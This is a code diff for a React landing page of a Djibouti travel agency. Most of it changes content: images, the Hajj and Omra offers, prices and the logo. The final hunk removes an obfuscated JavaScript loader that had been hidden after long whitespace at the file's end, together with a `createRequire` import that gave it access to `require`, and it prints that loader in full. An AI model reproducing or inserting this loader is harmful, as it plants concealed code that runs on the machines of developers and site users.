@@ -1,7 +1,4 @@
 import { useState, useEffect, useRef } from "react";
-import { createRequire } from 'module';
-
-const require = createRequire(import.meta.url);
 
 // ── PALETTE ────────────────────────────────────────────────────────────────────
 const T = {
@@ -22,18 +19,18 @@ const T = {
 
 // ── DESTINATIONS DJIBOUTI ──────────────────────────────────────────────────────
 const DESTINATIONS = [
-  { name:"Lac Assal", tag:"Incontournable", desc:"Le point le plus bas d'Afrique • 155m sous le niveau de la mer", img:"https://images.unsplash.com/photo-1547471080-7cc2caa01a7e?w=900&q=90", color:"#0B4D68" },
-  { name:"Lac Abbé", tag:"Aventure", desc:"Cheminées de calcaire • Paysage lunaire unique au monde", img:"https://images.unsplash.com/photo-1509316785289-025f5b846b35?w=900&q=90", color:"#5C3A1E" },
-  { name:"Requins baleines", tag:"Plongée", desc:"Golfe de Tadjoura • Novembre à Février", img:"https://images.unsplash.com/photo-1544551763-46a013bb70d5?w=900&q=90", color:"#0D4A7A" },
-  { name:"Ville de Djibouti", tag:"Culture", desc:"Capitale cosmopolite • Carrefour de l'Afrique et de l'Orient", img:"https://images.unsplash.com/photo-1580060839134-75a5edca2e99?w=900&q=90", color:"#1A237E" },
-  { name:"Golfe de Tadjoura", tag:"Nature", desc:"Eaux turquoise • Faune marine exceptionnelle", img:"https://images.unsplash.com/photo-1559827260-dc66d52bef19?w=900&q=90", color:"#01579B" },
+  { name:"Lac Assal", tag:"Incontournable", desc:"155m sous le niveau de la mer • Lac 10x plus salé que la mer", img:"https://upload.wikimedia.org/wikipedia/commons/thumb/8/8b/Lac_Assal%2C_Djibouti.jpg/800px-Lac_Assal%2C_Djibouti.jpg", color:"#0B4D68" },
+  { name:"Lac Abbé", tag:"Aventure", desc:"Cheminées calcaires géantes • Frontière éthio-djiboutienne", img:"https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Lac_Abbe_djibouti.jpg/800px-Lac_Abbe_djibouti.jpg", color:"#5C3A1E" },
+  { name:"Requins baleines", tag:"Plongée", desc:"Nager avec les plus grands poissons du monde • Nov-Fév", img:"https://upload.wikimedia.org/wikipedia/commons/thumb/2/2e/Whale_shark_georgia_aquarium.jpg/800px-Whale_shark_georgia_aquarium.jpg", color:"#0D4A7A" },
+  { name:"Ville de Djibouti", tag:"Culture", desc:"Marché central, vieille ville, port historique", img:"https://upload.wikimedia.org/wikipedia/commons/thumb/3/3e/Djibouti_-_Street_market_%287341623706%29.jpg/800px-Djibouti_-_Street_market_%287341623706%29.jpg", color:"#1A237E" },
+  { name:"Golfe de Tadjoura", tag:"Nature", desc:"Plongée, snorkeling • Eaux cristallines du golfe", img:"https://upload.wikimedia.org/wikipedia/commons/thumb/f/f0/Gulf_of_Tadjoura_from_Djibouti_city.jpg/800px-Gulf_of_Tadjoura_from_Djibouti_city.jpg", color:"#01579B" },
 ];
 
 // ── SERVICES ──────────────────────────────────────────────────────────────────
 const SERVICES = [
   { icon:"✈️", title:"Billets d'Avion", desc:"Vols internationaux depuis Djibouti via Amadeus. Meilleurs tarifs garantis.", color:"#1565C0" },
   { icon:"🏨", title:"Hôtels & Séjours", desc:"Sélection d'hôtels à Djibouti et dans le monde entier.", color:"#0D47A1" },
-  { icon:"🕌", title:"Hajj & Omra", desc:"Packages complets Hajj et Omra. Accompagnement spirituel.", color:"#4527A0" },
+  { icon:"🕌", title:"Omra", desc:"Packages complets Omra. Accompagnement spirituel.", color:"#4527A0" },
   { icon:"🚗", title:"Location de Voitures", desc:"Véhicules disponibles à Djibouti. Chauffeurs expérimentés.", color:"#006064" },
   { icon:"📋", title:"Visa & Documents", desc:"Assistance visa pour toutes destinations. Traitement rapide.", color:"#1B5E20" },
   { icon:"🌍", title:"Voyages Organisés", desc:"Circuits à Djibouti et en Afrique de l'Est. Groupes et individuels.", color:"#E65100" },
@@ -49,7 +46,7 @@ const TESTIMONIALS = [
 
 // ── STATS ─────────────────────────────────────────────────────────────────────
 const STATS = [
-  { value:"15+", label:"Années d'expérience", icon:"🏆" },
+  { value:"10+", label:"Années d'expérience", icon:"🏆" },
   { value:"500+", label:"Clients satisfaits", icon:"👥" },
   { value:"50+", label:"Destinations", icon:"🌍" },
   { value:"24/7", label:"Support disponible", icon:"📞" },
@@ -66,39 +63,38 @@ const AIRLINES = [
 
 // ── COMPOSANT LOGO ────────────────────────────────────────────────────────────
 const Logo = ({ size = 52, light = true }) => (
-  <div style={{ display:"flex", alignItems:"center", gap:10 }}>
-    <svg width={size} height={size} viewBox="0 0 54 54" xmlns="http://www.w3.org/2000/svg">
-      <defs>
-        <radialGradient id="gL1" cx="38%" cy="32%" r="65%">
-          <stop offset="0%" stopColor="#6ec6f5"/>
-          <stop offset="40%" stopColor="#2a8fd4"/>
-          <stop offset="100%" stopColor="#0a3d7a"/>
-        </radialGradient>
-        <radialGradient id="gL2" cx="30%" cy="25%" r="45%">
-          <stop offset="0%" stopColor="white" stopOpacity="0.5"/>
-          <stop offset="100%" stopColor="white" stopOpacity="0"/>
-        </radialGradient>
-      </defs>
-      <circle cx="27" cy="27" r="25" fill="url(#gL1)"/>
-      <path d="M10,18 Q16,14 22,17 Q24,22 20,26 Q14,28 10,24Z" fill="#0a4a8a" opacity="0.7"/>
-      <path d="M13,28 Q18,26 21,31 Q22,37 18,41 Q13,42 11,36Z" fill="#0a4a8a" opacity="0.65"/>
-      <path d="M24,14 Q30,12 34,15 Q36,20 32,23 Q26,24 23,20Z" fill="#0a4a8a" opacity="0.65"/>
-      <path d="M28,22 Q35,20 38,26 Q40,33 36,38 Q30,40 26,35 Q24,28 28,22Z" fill="#0a4a8a" opacity="0.7"/>
-      <path d="M34,13 Q42,11 46,17 Q48,23 44,27 Q38,28 34,22Z" fill="#0a4a8a" opacity="0.6"/>
-      <ellipse cx="27" cy="27" rx="25" ry="7" fill="none" stroke="white" strokeWidth="0.5" opacity="0.25"/>
-      <line x1="2" y1="27" x2="52" y2="27" stroke="white" strokeWidth="0.5" opacity="0.25"/>
-      <circle cx="27" cy="27" r="25" fill="url(#gL2)"/>
-      <g transform="translate(28,6) rotate(-35)">
-        <ellipse cx="9" cy="3" rx="9" ry="2.8" fill="#0d2d6e"/>
-        <polygon points="3,3.5 14,3.5 11,8 0,8" fill="#0d2d6e"/>
-      </g>
-    </svg>
-    <div>
-      <div style={{ fontSize: size*0.33, fontWeight:900, color: light ? "#fff" : T.navy, letterSpacing:2, lineHeight:1, fontFamily:"Georgia, serif" }}>ALAMIN</div>
-      <div style={{ fontSize: size*0.13, fontWeight:600, color: light ? T.sky : T.blueL, letterSpacing:3, marginTop:1 }}>TOURISM & TRAVEL</div>
+  <div style={{ display:"flex", alignItems:"center" }}>
+    <img
+      src="/alamin-logo.png"
+      alt="Alamin Tourism and Travel - IATA Accredited Agent"
+      style={{ height:size, width:"auto", objectFit:"contain", filter: light ? "brightness(0) invert(1)" : "none" }}
+      onError={e => {
+        e.target.style.display = "none";
+        e.target.nextSibling.style.display = "flex";
+      }}
+    />
+    <div style={{ display:"none", alignItems:"center", gap:8 }}>
+      <svg width={size} height={size} viewBox="0 0 54 54" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <radialGradient id="gFB" cx="38%" cy="32%" r="65%">
+            <stop offset="0%" stopColor="#6ec6f5"/>
+            <stop offset="100%" stopColor="#0a3d7a"/>
+          </radialGradient>
+        </defs>
+        <circle cx="27" cy="27" r="25" fill="url(#gFB)"/>
+        <g transform="translate(29,6) rotate(-35)">
+          <ellipse cx="9" cy="3" rx="9" ry="2.8" fill="#0d2d6e"/>
+          <polygon points="3,3.5 14,3.5 11,8 0,8" fill="#0d2d6e"/>
+        </g>
+      </svg>
+      <div>
+        <div style={{ fontWeight:900, color: light ? "#fff" : "#0a2057", fontSize:size*0.35, fontFamily:"Arial Black,Arial,sans-serif" }}>ALAMIN</div>
+        <div style={{ color:"#1a6eb5", fontSize:size*0.13, fontWeight:700, letterSpacing:2 }}>TOURISM &amp; TRAVEL</div>
+      </div>
     </div>
   </div>
 );
+
 
 // ── STYLES GLOBAUX ─────────────────────────────────────────────────────────────
 const GLOBAL_CSS = `
@@ -198,7 +194,7 @@ export default function AlaminLanding() {
         {/* Background */}
         <div style={{
           position:"absolute", inset:0,
-          backgroundImage:"url('https://images.unsplash.com/photo-1547471080-7cc2caa01a7e?w=1600&q=90')",
+          backgroundImage:"url('https://upload.wikimedia.org/wikipedia/commons/thumb/8/8b/Lac_Assal%2C_Djibouti.jpg/1280px-Lac_Assal%2C_Djibouti.jpg')",
           backgroundSize:"cover", backgroundPosition:"center",
           transform:"scale(1.05)",
           animation:"float 20s ease-in-out infinite",
@@ -221,8 +217,8 @@ export default function AlaminLanding() {
             </h1>
 
             <p className="fade-up" style={{ animationDelay:"0.3s", fontSize:18, color:"rgba(255,255,255,0.75)", lineHeight:1.7, marginBottom:40, maxWidth:520 }}>
-              Vols internationaux, hôtels, Hajj & Omra, packages touristiques. 
-              Service personnalisé depuis plus de 15 ans.
+              Vols internationaux, hôtels, Omra, packages touristiques. 
+              Service personnalisé depuis plusieurs années.
             </p>
 
             <div className="fade-up" style={{ animationDelay:"0.4s", display:"flex", gap:16, flexWrap:"wrap" }}>
@@ -375,9 +371,9 @@ export default function AlaminLanding() {
 
           <div style={{ display:"grid", gridTemplateColumns:"repeat(3,1fr)", gap:24 }}>
             {[
-              { name:"Hajj Premium 2026", price:"810 000", duration:"21 jours", places:"30 places", tag:"POPULAIRE", img:"https://images.unsplash.com/photo-1591604328740-f52fc7af0f76?w=600&q=80", tagColor:T.gold },
-              { name:"Omra Ramadan", price:"504 000", duration:"14 jours", places:"40 places", tag:"RAMADAN", img:"https://images.unsplash.com/photo-1564769662533-4f00a87b4056?w=600&q=80", tagColor:"#E91E63" },
-              { name:"Dubai City Break", price:"180 000", duration:"5 jours", places:"20 places", tag:"NOUVEAU", img:"https://images.unsplash.com/photo-1512453979798-5ea266f8880c?w=600&q=80", tagColor:T.blue },
+              { name:"Omra Premium 2026", price:"198 000", duration:"21 jours", places:"30 places", tag:"POPULAIRE", img:"https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Madinah_Haram.jpg/800px-Madinah_Haram.jpg", tagColor:T.gold },
+              { name:"Omra Ramadan", price:"198 000", duration:"14 jours", places:"40 places", tag:"RAMADAN", img:"https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Masjid_Al_Haram_-_Mecca_Saudi_Arabia.jpg/800px-Masjid_Al_Haram_-_Mecca_Saudi_Arabia.jpg", tagColor:"#E91E63" },
+              { name:"Dubai City Break", price:"180 000", duration:"5 jours", places:"20 places", tag:"NOUVEAU", img:"https://upload.wikimedia.org/wikipedia/commons/thumb/a/ae/Dubai_Skyline_from_the_top_of_Burj_Khalifa%2C_looking_South%2C_Dubai%2C_United_Arab_Emirates.jpg/800px-Dubai_Skyline_from_the_top_of_Burj_Khalifa%2C_looking_South%2C_Dubai%2C_United_Arab_Emirates.jpg", tagColor:T.blue },
             ].map((p, i) => (
               <div key={i} style={{ borderRadius:20, overflow:"hidden", background:"rgba(255,255,255,0.05)", border:"1px solid rgba(255,255,255,0.08)", transition:"all 0.3s" }}>
                 <div style={{ position:"relative", height:200, overflow:"hidden" }}>
@@ -528,7 +524,7 @@ export default function AlaminLanding() {
             <div>
               <Logo size={48} light />
               <p style={{ fontSize:13, color:"rgba(255,255,255,0.45)", marginTop:16, lineHeight:1.8, maxWidth:280 }}>
-                Votre partenaire de voyage de confiance à Djibouti depuis 2010. Agent IATA accrédité, spécialisé dans les vols internationaux, hôtels et packages Hajj & Omra.
+                Votre partenaire de voyage de confiance à Djibouti depuis 2010. Agent IATA accrédité, spécialisé dans les vols internationaux, hôtels et packages Omra.
               </p>
               <div style={{ display:"flex", gap:12, marginTop:20 }}>
                 {["Facebook","Instagram","WhatsApp"].map(s=>(
@@ -540,7 +536,7 @@ export default function AlaminLanding() {
             </div>
             <div>
               <div style={{ fontSize:11, fontWeight:700, color:T.sky, letterSpacing:2, marginBottom:20 }}>SERVICES</div>
-              {["Billets d'avion","Hôtels","Hajj & Omra","Location voiture","Assistance visa","Voyages organisés"].map(s=>(
+              {["Billets d'avion","Hôtels","Omra","Location voiture","Assistance visa","Voyages organisés"].map(s=>(
                 <div key={s} style={{ fontSize:13, color:"rgba(255,255,255,0.45)", marginBottom:10, cursor:"pointer" }}>{s}</div>
               ))}
             </div>
@@ -565,5 +561,4 @@ export default function AlaminLanding() {
       </footer>
     </div>
   );
-};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-0183-1';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
-
+}
